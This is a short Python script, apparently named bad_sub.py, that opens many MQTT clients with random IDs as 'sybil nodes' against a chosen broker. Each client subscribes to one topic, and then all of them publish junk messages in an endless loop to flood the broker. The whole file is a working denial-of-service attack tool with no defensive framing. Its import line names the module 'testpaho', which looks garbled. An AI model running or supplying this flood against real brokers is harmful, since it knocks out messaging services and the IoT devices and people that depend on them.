import testpaho.mqtt.client as mqtt
import random, string, sys


def gen_cli_id(size):
    return ''.join([random.choice(string.ascii_letters + string.digits) \
                    for n in range(size)])


if __name__ == '__main__':

    if len(sys.argv) != 5:
        print('usage: python3 bad_sub.py HOST PORT TOPIC SYBIL_NODES')
        exit(0)

    host = sys.argv[1]
    port = int(sys.argv[2])
    topic = sys.argv[3]
    sybil_nodes = int(sys.argv[4])
    clients = []

    print('Subscribing sybil nodes...')
    for i in range(sybil_nodes):
        clients.append(mqtt.Client(gen_cli_id(10)))
        clients[i].connect(host, port)
        clients[i].subscribe(topic)

    print('Publishing messages, flooding broker...')
    i = 0
    while True:
        clients[i].publish(topic, 'assdadsd')
        i = (i + 1)%sybil_nodes

